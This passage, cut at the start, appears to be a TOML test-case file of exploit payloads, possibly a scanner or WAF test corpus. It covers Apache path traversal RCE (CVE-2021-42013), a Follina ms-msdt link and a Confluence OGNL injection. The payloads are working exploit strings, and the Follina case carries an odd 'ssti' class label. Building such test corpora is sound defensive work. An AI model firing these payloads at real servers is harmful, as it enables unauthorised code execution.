payload = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
description = "Apache 2.4.49/50 path traversal + RCE (CVE-2021-42013)"

[[case]]
id = "cve_2022_30190_follina_msdt"
class = "ssti"
payload = "<a href=\"ms-msdt:/id PCWDiagnostic /skip force /param &quot;IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_BrowseForFile=h$(IEX('Invoke-Expression cmd'))i/../../$(IEX('start calc'))i.htm&quot;\">x</a>"
description = "Follina ms-msdt RCE"

[[case]]
id = "cve_2022_26134_atlassian_confluence_ognl"
class = "ssti"
payload = "${(#_memberAccess[\"allowStaticMethodAccess\"]=true).(@java.lang.Runtime@getRuntime().exec(\"id\"))}"
